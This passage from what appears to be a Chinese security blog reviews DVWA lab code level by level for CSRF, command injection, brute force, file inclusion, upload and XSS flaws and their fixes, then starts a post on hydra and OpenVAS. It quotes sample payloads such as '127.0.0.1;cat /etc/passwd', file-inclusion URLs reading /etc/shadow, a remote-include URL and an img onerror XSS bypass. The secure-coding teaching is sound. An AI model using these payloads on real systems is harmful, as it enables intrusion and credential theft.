"UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Feedback for the user echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"; &#125; &#125; else &#123; // Didn't come from a trusted source echo "&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"; &#125; mysql_close(); &#125; ?&gt; 在这个级别的CSRF漏洞中，服务端多了一句eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ]校验，ereg()函数是模式匹配，通过超全局数组获取了请求头referer值（也就是访问者向host发起请求时所在的页面）和host值，并且检查host的值是否在referer中出现。根据权威(https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)，这两个值无法以编程的方式修改，抓包除外，因为在csrf中无法通过抓取客户端的包进行修改，所以按理来说是安全的。实则不然，通过公网服务器，诱使victim访问名字包含host的html文件就可以实现绕过。 High level1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Feedback for the user echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"; &#125; mysql_close(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 在高级别中的代码，主要是使用了Anti-csrf机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。我们可以按F12来看看这个token: 可以看到不同的用户会返回一个不同的token，这个token在hidden栏里面,这样一来，迫于同源策略，攻击者无法获取victim的token，也就无法实现CSRF攻击。但是真的无法实现吗？配合xss我们还是可以盗取token的，但是这难度无疑增大，我们必须要有服务器的一个xss漏洞来盗取token，然后再使用CSRF。攻击成本也增大。 Impossible level123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_curr = $_GET[ 'password_current' ]; $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = mysql_real_escape_string( $pass_curr ); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; // It does! $pass_new = stripslashes( $pass_new ); $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching echo "&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 在high的基础上，直接进行了密码再认证，这样一来，即使盗取了token，没有原始密码，也无法进行修改密码的操作，这样CSRF就可以完全避免了。所以通过这个CSRF系列，我们可以知晓，在csrf防御中，采用关键操作的原子性认证，是避免这一漏洞攻击的不二办法。其实我们只关注了CSRF部分，在之前的level中，也还存在了sql注入，在这个impossible版本里，还使用了之前提到的预操纵来进行数据库交互，降低了sql注入的风险。 Command Injection Low level12345678910111213141516171819202122&lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; &#125; ?&gt; 过分相信用户的输入，直接拼接到ping 命令中，会造成命令注入。注意到常用的bash命令拼接的方式有||.&amp;&amp;,|,&amp;,;这五个，所以由于没有过滤完全，我们直接进行命令拼接，然后执行任意命令，如127.0.0.1;cat /etc/passwd。 Medium level123456789101112131415161718192021222324252627282930&lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; &#125; ?&gt; 这里采用黑名单过滤的方式，注意到黑名单的办法存在的通病就是过滤不完全。可以看到这里也一样，没有把之前提到的东西给过滤完全。其实highlevel也是一样的，过滤语句写得不严谨，多加了空格，造成绕过，这里就不再展开叙述了。同过这个例子可以直观的看到黑名单式过滤方式是不安全的，容易出岔子。接着我们将看到Impossible等级下的白名单试想方式。直接指定只接受num.num.num.num型的输入，也就是我们期望的输入，从而避免了命令执行。 Impossible level123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( ".", $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; &#125; else &#123; // Ops. Let the user name theres a mistake echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; Brute Force暴力枚举攻击，服务端没有在后台设置错误次数上限和相关校验，就会给攻击者暴力枚举用户或者基于字典的密码暴力破解。所以正确的代码编写规范需要规定容许的错误尝试次数，超过这个值就会锁定账户一个定义长的时间。这里需要明确，光加入一个随机的token就想避免Brute Force是相当幼稚的，攻击者通过python脚本来抓取页面的token，就可以完全绕过，这也是high等级所犯的错。这里就不展示，只列出impossible等级和low 等级的代码，供日后查阅： low level 1234567891011121314151617181920212223242526272829303132&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; // Get users details $avatar = mysql_result( $result, 0, "avatar" ); // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; mysql_close(); &#125; ?&gt; Impossible level 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?php if( isset( $_POST[ 'Login' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_POST[ 'username' ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_POST[ 'password' ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) ) &#123; // User locked out. Note, using this method would allow for user enumeration! //echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;"; // Calculate when the user would be allowed to login again $last_login = $row[ 'last_login' ]; $last_login = strtotime( $last_login ); $timeout = strtotime( "&#123;$last_login&#125; +&#123;$lockout_time&#125; minutes" ); $timenow = strtotime( "now" ); // Check to see if enough time has passed, if it hasn't locked the account if( $timenow &gt; $timeout ) $account_locked = true; &#125; // Check the database (if username matches the password) $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR); $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123; // Get users details $avatar = $row[ 'avatar' ]; $failed_login = $row[ 'failed_login' ]; $last_login = $row[ 'last_login' ]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) &#123; echo "&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"; echo "&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"; &#125; // Reset bad login count $data = $db-&gt;prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; else &#123; // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"; // Update bad login count $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Set the last login time $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 我们可以看到，在impossible代码中，不但设置了错误次数锁，Anti-CSRF token,而且还提供了暴力尝试信息反馈，当用户登陆成功后会将被暴力登陆的次数给反馈给正确登陆的用户。这个实现得益于，每次错误尝试都会更新last_login的时间和failed_login+1操作，然后将之入库。 Local File Inclusion) 漏洞根据利用方式可以分为：本地文件包含(Local File Inclusion),简称LFI。远程文件包含(Remote File Inclusion),简称RFI。 涉及到的函数如下：1234567include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。 include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。 require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 文件包含光从字面意思来看是可以通过漏洞利用泄露一些本地敏感文件，但是益于以上几个函数在包含文件的时候是默认把文件当成代码来对待，如果出现可执行的php片段就会执行这一性质，文件包含漏洞一般是可以进行任意代码执行的，只要我们能够让服务器包含我们可控的代码段。 Low level123456&lt;?php // The page we wish to display $file = $_GET[ 'page' ]; ?&gt; 没有对我们的输入做任何过滤，可以说是一点安全意识都没有。随便利用。举个栗子：http://localhost/dvwa/vulnerabilities/fi/page=/etc/shadow当然也可以在服务端写下poc.php,利用http协议实现代码执行http://localhost/dvwa/vulnerabilities/fi/page=http://[ip]/poc.php。前提条件是allow_url_fopen和allow_url_include处于打开状态。 Medium level123456789&lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation $file = str_replace( array( "http://", "https://" ), "", $file ); $file = str_replace( array( "../", "..\"" ), "", $file ); ?&gt; 首先这个基于黑名单的过滤，压根就没有把本地绝对路径考虑到，其次可以使用..././,htthttpp进行绕过。 High level12345678910111213&lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation if( !fnmatch( "file*", $file ) &amp;&amp; $file != "include.php" ) &#123; // This isn't the page we want! echo "ERROR: File not found!"; exit; &#125; ?&gt; 这是一种基于白名单的过滤，只接受前缀为“file”的文件，咋一看很ok，然而却疏忽了file协议。http://localhost/vulnerabilities/fi/?page=file:///etc/passwd Impossible level1234567891011121314&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Only allow include.php or file&#123;1..3&#125;.php if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; &#125; ?&gt; 这是相当的白名单，你赢了。但是想要文件量巨大的场景中维护这么一张白名单有点不太理智，所以笔者这种硬编码的方式不太常用。 upload file上传漏洞经常可以用来上传任意代码泄露系统信息，如&lt;?php phpinfo();?&gt;，甚至可以直接上传webshell，拿下服务器权限，所以这个漏洞是十分严重的。 Low level12345678910111213141516171819&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; ?&gt; 可以看到上面的代码对用户上传的文件（$_FILE全局数组的形式）没有进行任何的验证操作，就直接将其move到了upload目录，这是相当危险的操作，攻击者可以毫无忌惮的随意日。 Medium level12345678910111213141516171819202122232425262728293031323334&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; #只判断了MIME // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; ?&gt; 上面的代码加入了MIME判断，所谓的MIME判断是在请求头中的一个字段，用来指示文件类型，方便服务器进行对应的处理，只要抓包就可以随意修改，达到欺骗服务器的目的。（更多的解释可以查看：https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types） High level1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; ?&gt; 我们首先看到这个代码中使用的验证手段( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ), 首先判断文件名结尾是不是’jpg’,’jepg’,’png’类型，然后调用getimagesize()函数获取图像大小，其实就是判断图像格式是否规范。函数细节可以参看官网表述:（http://php.net/manual/zh/function.getimagesize.php） 然后文件大小也进行了判断。所以这里主要存在两个限制条件，首先必须以特定文件名结尾，然后文件格式还得满足特定的图片格式。但是这样的代码虽然加大攻击难度，在一些条件成立的条件下，仍旧可以进行攻击，上传shell,首先图片格式可以伪造，在元数据中包含webshell，然后找到一个文件包含漏洞，就可以成功实现攻击，上c传shell。 Impossible level123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; //$target_file = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; $target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; $temp_file = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == 'image/jpeg' ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; // Yes! echo "&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"; &#125; else &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 这个代码规范里，除了有之前所说的一些限制外，还加上了随机id与文件名结合MD5编码作为文件名，这会让webshell连接的时候找不到具体的文件而吃闭门羹。而且使用了imagecreatefromjpeg（）函数来对上次的图进行了重构，去除了多余的元数据，使得webshell无法隐匿在图片里面。这样一来双重保险下，彻底断绝了upload漏洞的可能。当然这里仍旧加入了Anti-CSRFtoken来防止CSRF攻击。 XSS反射型反射型xss是一种attack通过操作url，web应用将attack输入的url参数不加过滤或者过滤不全的情况下直接回显到客户端，造成前端脚本注入执行（多是JS执行），读者可以通过以下的实例看到漏洞的产生细节。当然在反射型xss中有一种别具一格的漏洞利用方式，那就是DOM型xss,这种类型的xss不会直接出现拼接到源码中，而是js在运行时操作dom对象来实现输出。DVWA只对xss笼统的归纳，归纳为反射型和存储型。那么我们就先对这两种编码规范进行理解（把dom 型xss放一放)。由于本身的代码量不大，所以直接给出所有反射型代码如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//Low&lt;?php // Is there any input? if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; &#125; ?&gt; //Medium&lt;?php // Is there any input? if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"; &#125; ?&gt; //High&lt;?php // Is there any input? if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"; &#125; ?&gt; //Impossible&lt;?php // Is there any input? if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 通过以上的代码范例可以看到，在medium和high的防御措施上，仍旧是黑名单式的过滤，而且思考的很狭隘，只是过滤了&lt;script&gt;标签，medium中直接硬编码的黑名单最不可取，别说换标签，直接大小写绕过；在High级别里面，通过正则，避免了&lt;script&gt;标签使用的可能，但是能够触发js的标签远不止这一个，随便一个如&lt;img src=1 onerror=[xss]&gt;都是可以绕过的。可以想到基于黑名单的策略是很容易疏漏的，不可取。在impossible中，直接对输入进行htnlspecilchars()编码转换，杜绝了xss。 存储型注意下面的代码只是偏向于服务器对用户的输入不经过验证处理就直接入库，导致下次取出展现到前端的时候出现xss。代码没有包含从数据库取出的操作部分。因为只要从用户获取到数据后进行了严格的验证处理，就可以避免存储型xss，所以最终原因不是从数据库取出部分，所以DVWA省略掉了。出于篇幅原因，在DVWA的存储型的漏洞复现中的缺陷细节和反射型类似，都是标签，正则过滤不全。就不再赘述，现把impossible代码规范列出：1234567891011121314151617181920212223242526272829303132&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = mysql_real_escape_string( $name ); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到代码中对txtName和mtxMessage用htmlspecialchars()转义成了html实体，但是仅有这个是不够的，我们从前面的函数解释可以了解到，这个函数在不加ENT_QUOTES参数是默认不转义&#39;，而且该函数不考虑\（容易造成sql注入，语句单引号被转义问题，当然数据库交互不是PDO模式才有可能存在sql注入），这样仍旧会造成xss，好在代码之前还使用了stripslashes()和mysql_real_escape_string()来分别对&#39;和\进行过，从而杜绝了xss。 参考文献https://www.sitepoint.com/top-10-php-security-vulnerabilities/http://blog.jobbole.com/53821/https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheethttp://www.dvwa.co.uk/https://github.com/Go0s/LFIboomCTF]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web安全</tag>
        <tag>代码审计</tag>
        <tag>安全编码规范</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建]]></title>
    <url>%2F2018%2F08%2F14%2Fmysql%E5%BC%B1%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[hydra是一个基于字典的密码暴力破解工具，在kali里面集成，在其他发行版里也大都可以通过包管理器进行安装。它默认集成了很多常用的服务以及协议暴力枚举攻击载荷，在渗透测试中有举足轻重的作用。同样的，openvas是一个漏洞扫描器，真的是相当的强大，里面搜录了40多万个漏洞，包括CVE,NVD漏洞平台等，是Nessus项目分支并且开源，在mysql弱密码的漏洞的学习和自动化工具使用的过程中，被这两个工具深深安利到了，所以写下这篇文章，主要介绍工具的使用和安装过程。 hydrahydra 这个工具的安装还是比较的友好，可以直接使用的包管理器。在日常的使用中，要注意收集一些比较好用的字典，或者根据渗透测试的信息搜集，生成一些比较有针对性的字典。 hydra的强大体现在它支持的服务类型相当的多，集成化很高，并且使用接口很简单，目前支持的服务类型有123456789Asterisk,AFP,CiscoAAA,Ciscoauth,Ciscoenable,CVS,Firebird,FTP,HTTP-FORM-GET,HTTP-FORM-POST,HTTP-GET,HTTP-HEAD,HTTP-POST,HTTP-PROXY,HTTPS-FORM-GET,HTTPS-FORM-POST,HTTPS-GET,HTTPS-POST,HTTPS-HEAD,HTTP-Proxy,ICQ,IMAP,IRC,LDAP,MS-SQL,MYSQL,NCP,NNTP,OracleListener,OracleSID,Oracle,PC-Anywhere,PCNFS,POP3,POSTGRES,RDP,Rexec,Rlogin,Rsh,RTSP,S7-300,SAP/R3,SIP,SMB,SMTP,SMTPEnum,SNMP,SOCKS5,SSH(v1andv2),Subversion,Teamspeak(TS2),Telnet,VMware-Auth,VNCandXMPP. 参数介绍1234567891011121314151617181920212223242526272829303132333435363738394041hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns][-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]-R 继续从上一次进度接着破解。-S 采用SSL链接。-s PORT 可通过这个参数指定非默认端口。-l LOGIN 指定破解的用户，对特定用户破解。-L FILE 指定用户名字典。-p PASS 